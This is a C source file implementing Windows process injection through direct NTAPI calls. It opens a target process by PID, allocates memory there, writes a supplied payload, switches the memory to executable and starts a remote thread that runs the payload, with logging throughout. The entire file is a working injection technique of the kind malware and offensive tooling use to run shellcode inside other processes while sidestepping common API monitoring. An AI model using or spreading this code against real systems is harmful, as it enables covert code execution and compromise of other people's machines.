#include "headers.h"

UINT_PTR GetNtFunctionAddress(
	_In_ CONST HMODULE ModuleHandle, 
	_In_ LPCSTR FunctionName
) {

	UINT_PTR FunctionAddress = 0;

	FunctionAddress = (UINT_PTR)GetProcAddress(ModuleHandle, FunctionName);
	if (0 == FunctionAddress) {
		warn("[GetProcAddress] failed, error: 0x%lx", GetLastError());
		return 0;
	}

	okay("[0x%p] -> %s!", (PVOID)FunctionAddress, FunctionName);
	return FunctionAddress;

}


BOOL ntapiInject(_In_ CONST DWORD PID, _In_ CONST PBYTE toEmbed, _In_ CONST SIZE_T size_of_toEmbed) {
	BOOL      state = TRUE;
	PVOID     baseAddr = NULL;
	HANDLE    hThread = INVALID_HANDLE_VALUE;
	HANDLE    hProcess = INVALID_HANDLE_VALUE;
	HMODULE   hNTDLL = NULL;
	DWORD     oldProtect = 0;
	SIZE_T    numBytesWritten = 0;
	NTSTATUS  Status = 0;
	CLIENT_ID clientId = { (HANDLE)PID, NULL };
	OBJECT_ATTRIBUTES OA = { sizeof(OA),  NULL };

	hNTDLL = GetModuleHandleW(L"NTDLL");
	if (hNTDLL == NULL) {
		warn("Failed to get a handle to module ntdll.dll error: [0x%ld]", GetLastError());
		return NULL; // Return NULL on failure
	}
	info("Got a handle to module NTDLL (0x%p)", hNTDLL);


	//Get the Addresses to NTAPI functions
	NtCreateThreadEx createThreadEx = (NtCreateThreadEx)GetNtFunctionAddress(hNTDLL, "NtCreateThreadEx");
	NtOpenProcess openProc = (NtOpenProcess)GetNtFunctionAddress(hNTDLL, "NtOpenProcess");
	NtClose closeH = (NtClose)GetNtFunctionAddress(hNTDLL, "NtClose");
	NtAllocateVirtualMemoryEx allocateVirtualMemoryEx = (NtAllocateVirtualMemoryEx)GetNtFunctionAddress(hNTDLL, "NtAllocateVirtualMemoryEx");
	NtWriteVirtualMemory writeMemory = (NtWriteVirtualMemory)GetNtFunctionAddress(hNTDLL, "NtWriteVirtualMemory");
	NtProtectVirtualMemory protectMemory = (NtProtectVirtualMemory)GetNtFunctionAddress(hNTDLL, "NtProtectVirtualMemory");
	NtWaitForSingleObject waitForObj = (NtWaitForSingleObject)GetNtFunctionAddress(hNTDLL, "NtWaitForSingleObject");
	NtFreeVirtualMemory freeMemory = (NtFreeVirtualMemory)GetNtFunctionAddress(hNTDLL, "NtFreeVirtualMemory");

	printf("\nTrying to open a handle to process with PID: %ld\n", PID);
	//Opening a handle to the process using the provided PID
	Status = openProc(&hProcess, PROCESS_ALL_ACCESS, &OA, &clientId);
	if (Status != STATUS_SUCCESS) {
		warn("Failed to get a handle to process with PID %ld NTSTATUS code 0x%X\n", PID, Status);
		return EXIT_FAILURE;
	}
	okay("Got a handle to the process! NTSTATUS code: 0x%X\n", Status);

	//allocate memory needed to prepare the spaceB before writing the data in
	Status = allocateVirtualMemoryEx(hProcess, &baseAddr, &size_of_toEmbed, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, NULL, 0);
	if (Status != STATUS_SUCCESS) {
		warn("Failed to allocate virtual memory NTSTATUS code 0x%X\n", Status);
		state = EXIT_FAILURE; goto CLEANUP;
	}
	okay("%zu-bytes was allocated with PAGE_EXECUTE_READWRITE permissions! NTSTATUS: 0x%X", size_of_toEmbed, Status);

	//write allocated memory to the process memory
	Status = writeMemory(hProcess, baseAddr, toEmbed, size_of_toEmbed, &numBytesWritten);
	if (Status != STATUS_SUCCESS) {
		warn("Failed to write buffer to memory NTSTATUS code 0x%X\n", Status);
		state = EXIT_FAILURE; goto CLEANUP;
	}
	okay("Wrote %zu-bytes to process memory! NTSTATUS: 0x%X", size_of_toEmbed, Status);

	Status = protectMemory(hProcess, &baseAddr, &size_of_toEmbed, PAGE_EXECUTE_READ, &oldProtect);
	if (Status != STATUS_SUCCESS) {
		warn("Failed to protect buffer memory NTSTATUS code 0x%X\n", Status);
		state = EXIT_FAILURE; goto CLEANUP;
	}
	okay("Protected process memory! NTSTATUS: 0x%X", Status);

	//Create thread to run allocated payload
	Status = createThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, baseAddr, NULL, FALSE, 0, 0, 0, NULL);
	if (Status != STATUS_SUCCESS) {
		warn("Failed to get a handle to the thread, NTSTATUS: 0x%X", Status);
		state = EXIT_FAILURE; goto CLEANUP;
	}
	okay("Got a handle to the Thread! NTSTATUS: 0x%X\n\\---0x%p\n", Status, hThread);

	info("Payload Executing...\n");
	Status = waitForObj(hThread, FALSE, NULL);
	if (Status != STATUS_SUCCESS) {
		warn("Wait for OBJ func failed.");
		state = FALSE; goto CLEANUP;
	}
	info("Payload Finished executing\n");
	info("Cleaning Up :)\n");
	info("\nAll Done.\n");

CLEANUP:
	if (baseAddr) {
		Status = freeMemory(hProcess, &baseAddr, &size_of_toEmbed, MEM_DECOMMIT);
		if (STATUS_SUCCESS != Status) {
			warn("NtFreeVirtualMemory 0x%ld", Status);
		}
		else {
			info("[0x%p] decommitted allocated buffer from process memory", baseAddr);
		}
	}

	if (hThread) {
		info("[0x%p] handle on thread closed", hThread);
		NtClose(hThread);
	}

	if (hProcess) {
		info("[0x%p] handle on process closed", hProcess);
		NtClose(hProcess);
	}
	return state;
}